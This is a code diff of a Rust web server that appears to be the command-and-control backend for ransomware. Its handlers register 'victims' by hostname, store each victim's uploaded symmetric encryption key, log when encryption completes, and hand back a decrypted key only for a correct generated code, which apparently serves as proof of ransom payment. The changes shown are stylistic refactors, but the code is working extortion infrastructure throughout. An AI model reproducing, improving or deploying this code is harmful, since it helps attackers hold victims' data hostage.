@@ -105,7 +105,7 @@ async fn main() {
 
     let file_path = format!("{}/victims.csv", exe_directory_path.to_string_lossy());
     let victims = import_csv(&file_path);
-    let shared_state = AppState { victims: Arc::new(Mutex::new(victims)), file_path: file_path};
+    let shared_state = AppState { victims: Arc::new(Mutex::new(victims)), file_path};
     debug!("Web Application State Configured");
 
     let serve_public_assets = ServeEmbed::<AssetPublic>::new();
@@ -207,7 +207,7 @@ fn generate_code() -> String {
         }).collect::<String>()
     }).collect::<Vec<String>>().join("-");
     debug!("Generated new code: {}", code);
-    return code;
+    code
 }
 
 fn get_epoch_time() -> u64 {
@@ -246,7 +246,7 @@ fn decrypt_key(key: &str) -> String {
             return String::from("Invalid Key");
         }
     };    
-    return encode(key);
+    encode(key)
 }
 
 async fn register(State(state): State<AppState>, extract::Json(registration): extract::Json<Registration>) -> String {
@@ -288,7 +288,7 @@ async fn register(State(state): State<AppState>, extract::Json(registration): ex
             Some(existing_victim) => {
                 warn!("[{}] Existing Victim Found: {:?}", registration.id, existing_victim);
                 warn!("[{}] Cannot Register New Victim", registration.id);
-                return String::from("Victim already exists");
+                String::from("Victim already exists")
             },
             None => {
                 let victim = Victim {id: registration.id, hostname: registration.hostname, key: String::new(), code: String::new(), upload_time: 0, complete: false};
@@ -296,9 +296,9 @@ async fn register(State(state): State<AppState>, extract::Json(registration): ex
                 victims.push(victim);
                 export_csv(&state.file_path, &victims);
                 debug!("Updated Victims CSV");
-                return String::from("Success");
+                String::from("Success")
             }
-        };
+        }
     }
 }
 
@@ -347,14 +347,14 @@ async fn upload_sym_key(State(state): State<AppState>, extract::Json(uploadsymke
                 info!("[{}] Added Upload Time: {:?}", uploadsymkey.id, existing_victim.upload_time);
                 export_csv(&state.file_path, &victims);
                 debug!("Updated Victims CSV");
-                return String::from("Success");
+                String::from("Success")
             },
             None => {
                 warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
                 warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
-                return String::from("Victim does not exist");
+                String::from("Victim does not exist")
             }
-        };
+        }
     }
 }
 
@@ -392,12 +392,12 @@ async fn announce_completion(State(state): State<AppState>, extract::Json(announ
                 existing_victim.complete = true;
                 export_csv(&state.file_path, &victims);
                 debug!("Updated Victims CSV");
-                return String::from("Success");
+                String::from("Success")
             },
             None => {
                 warn!("[{}] Existing Victim Not Found", announcecompletion.id);
                 warn!("[{}] Cannot Announce Completion", announcecompletion.id);
-                return String::from("Victim does not exist");
+                String::from("Victim does not exist")
             }
         }
     }
@@ -484,5 +484,5 @@ async fn download_sym_key(State(state): State<AppState>, extract::Json(downloads
         return decrypt_key(&existing_victim.key);
     }
     warn!("[{}] Incorrect Code: {}", downloadsymkey.id, downloadsymkey.code);
-    return "Invalid Code".to_string();
+    "Invalid Code".to_string()
 }
